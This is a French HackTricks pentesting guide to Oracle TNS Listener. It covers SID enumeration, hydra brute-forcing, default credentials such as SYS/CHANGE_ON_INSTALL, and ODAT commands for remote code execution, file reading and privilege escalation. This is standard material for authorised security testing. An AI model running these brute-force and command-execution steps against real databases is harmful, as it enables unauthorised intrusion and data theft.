# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informations de base

Oracle database (Oracle DB) est un syst√®me de gestion de base de donn√©es relationnelle (RDBMS) de la soci√©t√© Oracle (√† partir de [ici](https://www.techopedia.com/definition/8711/oracle-database)).

Lors de l'√©num√©ration d'Oracle, la premi√®re √©tape consiste √† parler au TNS-Listener qui r√©side g√©n√©ralement sur le port par d√©faut (1521/TCP, -vous pouvez √©galement obtenir des √©couteurs secondaires sur 1522-1529-).
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## R√©sum√©

1. **√ânum√©rer la version** des informations (rechercher des **vuln√©rabilit√©s connues**)
2. **Forcer la communication** du TNS listener (pas toujours n√©cessaire)
3. **√ânum√©rer** / Forcer **les noms SID** (comme les noms de base de donn√©es)
4. **Forcer les identifiants** pour le nom SID valide d√©couvert
5. Essayer d'**ex√©cuter du code**

Pour utiliser les modules oracle MSF, vous devez installer certaines d√©pendances: [**Installation**](oracle-pentesting-requirements-installation.md)

## √ânum√©ration

Les outils qui peuvent √™tre utilis√©s pour cela sont: nmap, MSF et [tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip).

### Version du TNS listener
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
Autres commandes utiles pour le TNS listener:

| **Commande** | **Objectif**                                                     |
| ------------ | --------------------------------------------------------------- |
| ping         | V√©rifier la connectivit√© avec le listener                        |
| version      | Fournir la version du listener et les informations de la plateforme |
| status       | Retourner l'√©tat actuel et les variables utilis√©es par le listener |
| services     | Afficher les donn√©es de service                                  |
| debug        | Afficher les informations de d√©bogage dans le journal du listener |
| reload       | Recharger le fichier de configuration du listener                |
| save\_config | √âcrire le fichier de configuration du listener dans un emplacement de sauvegarde |
| stop         | Arr√™ter le listener                                              |

Si vous **recevez une erreur**, cela peut √™tre d√ª √† une **incompatibilit√© des versions TNS** (utilisez le param√®tre `--10G` avec `tnscmd10`) et si l'**erreur persiste**, le listener peut √™tre **prot√©g√© par mot de passe** (vous pouvez voir une liste o√π toutes les [**erreurs sont d√©taill√©es ici**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)) - ne vous inqui√©tez pas... hydra √† la rescousse\*\*:\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
Le TNS listener peut √™tre vuln√©rable aux attaques **MitM**. [Consultez ici comment v√©rifier si le serveur est vuln√©rable et comment effectuer l'attaque (toutes les versions jusqu'√† la version 12c le sont)](tns-poison.md).

### √ânum√©ration des SID

#### **Qu'est-ce qu'un SID**

Le SID (Service Identifier) est essentiellement le nom de la base de donn√©es, selon l'installation, vous pouvez avoir un ou plusieurs SIDs par d√©faut, ou m√™me un SID d√©fini par le dba.

**Dans certaines anciennes versions (√† partir de la version 9), vous pouvez demander le SID et la base de donn√©es vous l'envoie :**
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
Si vous ne pouvez pas acc√©der aux SIDs de cette mani√®re, vous devrez les bruteforcer :

**Bruteforce de SID**

J'ai fusionn√© les listes de SID de nmap et MSF en une seule (sans doublons) :

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
Pour utiliser **oracle\_login** avec **patator**, vous devez **installer** :
```
pip3 install cx_Oracle --upgrade
```
## **Cibler des comptes**

Vous avez le SID ? Excellent, passons maintenant √† la t√¢che suivante et extrayons les informations de compte utilisateur. √Ä partir de ce point, vous pouvez vous connecter au listener et effectuer une attaque par force brute sur les identifiants.

**Metasploit** _\*\*scanner/oracle/oracle\_login_ dispose d'un dictionnaire int√©gr√© pour les **valeurs par d√©faut les plus populaires des informations de compte utilisateur** pr√©sent√©es sous forme de login: mot de passe. √Ä propos, de telles entr√©es par d√©faut repr√©sentent l'un des probl√®mes de s√©curit√© les plus populaires et les plus s√©rieux dans Oracle.

**Nmap** peut √©galement aider ici avec le script _oracle-brute_. Notez que ce script **m√©lange les identifiants et les mots de passe**, c'est-√†-dire qu'il essaie chaque identifiant avec chaque mot de passe, et cela prend assez longtemps !

### **Mots de passe par d√©faut**

Voici quelques-uns des mots de passe par d√©faut associ√©s √† Oracle :

* **DBSNMP/DBSNMP**‚Ää‚Äî‚ÄäL'agent intelligent l'utilise pour communiquer avec le serveur de la base de donn√©es (c'est un peu de travail pour le changer)
* **SYS/CHANGE\_ON\_INSTALL**‚Ää‚Äî‚ÄäCompte sysdba par d√©faut avant et y compris Oracle v9, √† partir de la version 10g cela doit √™tre diff√©rent !
* **PCMS\_SYS/PCMS\_SYS**‚Ää‚Äî‚ÄäCompte x par d√©faut
* **WMSYS/WMSYS**‚Ää‚Äî‚ÄäCompte x par d√©faut
* **OUTLN/OUTLN**‚Ää‚Äî‚ÄäCompte x par d√©faut
* **SCOTT/TIGER**‚Ää‚Äî‚ÄäCompte x par d√©faut

D'autres **mots de passe par d√©faut** peuvent √™tre trouv√©s [ici](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm) et [ici](https://cirt.net/passwords?vendor=Oracle).

Les versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2 et 11.2.0.3 sont vuln√©rables √† une **attaque par force brute hors ligne**. [**En savoir plus sur cette technique ici.**](remote-stealth-pass-brute-force.md)

### Attaque par force brute de nom d'utilisateur/mot de passe

Diff√©rents outils offrent des **listes d'utilisateurs/mots de passe diff√©rents** pour Oracle :

* **oscan :** _/usr/share/oscanner/accounts.default_ (169 lignes)
* **MSF-1 :** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598 lignes)
* **MSF-2 :** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568 lignes)
* **Nmap :** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687 lignes)

J'ai **m√©lang√©** tous ces fichiers et **supprim√© les doublons :**

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [Attaque par force brute](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

Maintenant que vous **avez un SID valide et des identifiants valides**. Pour vous connecter √† la base de donn√©es, vous avez besoin de l'outil : _**sqlplus**_ et pour l'installer, vous devez suivre quelques √©tapes :

[Installation](oracle-pentesting-requirements-installation.md)

Pour vous connecter en utilisant des identifiants connus :
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
Si le TNS Listener est sur un port non par d√©faut (par exemple TCP/1522) :
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
Si un **compte dispose de privil√®ges de base de donn√©es syst√®me (sysdba) ou d'op√©rateur syst√®me (sysop)**, vous pouvez essayer ce qui suit:
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **Tout en un**

**Un outil int√©ressant est oscanner**, qui va essayer d'obtenir un SID valide, puis il va effectuer une attaque de force brute pour obtenir des identifiants valides et essayer d'extraire des informations :
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
Un autre outil qui fera tout cela est [**odat**](https://github.com/quentinhardy/odat) :
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
Avec ces options (_-s_ et _-p_), ODAT **recherche des SID valides** (System ID) dans une premi√®re √©tape. Vous pouvez configurer certaines options pour configurer les m√©thodes (par exemple, une liste de mots ou une attaque par force brute). Par d√©faut, ODAT utilisera une grande liste de mots et effectuera une petite attaque par force brute.

Si ODAT **trouve au moins un SID** (par exemple, _ORCL_), il **recherchera des comptes Oracle valides**. Il le fera sur **chaque SID trouv√©**. Vous pouvez sp√©cifier certaines options pour les informations d'identification (par exemple, _--accounts-file_, _--accounts-files_, _--login-as-pwd_).

Pour **chaque compte valide** (par exemple, _SYS_) **sur chaque instance valide** (SID), ODAT renverra **ce que chaque utilisateur Oracle peut faire** (par exemple, un shell invers√©, lire des fichiers, devenir DBA).

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## Ex√©cution de code √† distance

Il existe au moins deux fa√ßons diff√©rentes d'ex√©cuter des commandes, telles que l'utilisation de proc√©dures Java et du package DBMS\_SCHEDULER. Vous pouvez √©galement obtenir une ex√©cution de code √† distance en cas d'injection SQL dans une application Web, √† condition bien s√ªr que l'utilisateur qui l'ex√©cute dispose des droits suffisants. √Ä ce stade, je recommande vivement de pr√©parer l'outil d'attaque de base de donn√©es Oracle : [ODAT](https://github.com/quentinhardy/odat).
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Ex√©cuter du code via une proc√©dure stock√©e Java
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
### Ex√©cuter du code via le planificateur

[Plus de d√©tails ici](oracle-rce-and-more.md#rce-java-store-procedure)
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[Plus de d√©tails ici](oracle-rce-and-more.md#rce-scheduler)

### Ex√©cuter du code via des tables externes
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‚ÄòODAT.py‚Äô n√©cessite le privil√®ge ‚ÄòCREATE ANY DIRECTORY‚Äô, qui, par d√©faut, n'est accord√© qu'au r√¥le DBA, car il tente d'ex√©cuter le fichier √† partir de n'importe quel r√©pertoire et pas seulement "votre" r√©pertoire (la version manuelle de cette attaque n√©cessite moins de privil√®ges).

[Plus de d√©tails ici.](oracle-rce-and-more.md#rce-external-tables)

## Lecture/√©criture de fichiers
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[Plus de d√©tails ici](oracle-rce-and-more.md#read-write-files)

## √âl√©vation de privil√®ges

[Plus de d√©tails ici](oracle-rce-and-more.md#elevating-privileges)

Vous pouvez utiliser le module [privesc](https://github.com/quentinhardy/odat/wiki/privesc) d'odat pour escalader les privil√®ges. Dans ce lien, vous pouvez trouver **plusieurs fa√ßons d'escalader les privil√®ges en utilisant odat.**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
Vuln√©rabilit√© test√©e sur Oracle 10.1.0.3.0 - devrait fonctionner jusqu'√† 10.1.0.5.0 et suppos√©ment sur 11g. Corrig√© avec la mise √† jour critique d'Oracle d'octobre 2007.
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## Environnement virtuel gratuit pour les tests

Si vous voulez vous entra√Æner √† attaquer des bases de donn√©es Oracle, le moyen le plus s√ªr est de vous inscrire pour la machine virtuelle Oracle Developer Days Virtualbox VM :

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

La plupart des informations de ce post ont √©t√© extraites de : [https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) et de [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

Autres **r√©f√©rences** int√©ressantes :

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## Commandes automatiques HackTricks
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for Oracle
  Note: |
    Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

    #great oracle enumeration tool
    navigate to https://github.com/quentinhardy/odat/releases/
    download the latest
    tar -xvf odat-linux-libc2.12-x86_64.tar.gz
    cd odat-libc2.12-x86_64/
    ./odat-libc2.12-x86_64 all -s 10.10.10.82

    for more details check https://github.com/quentinhardy/odat/wiki

    https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
  Name: Nmap
  Description: Nmap with Oracle Scripts
  Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
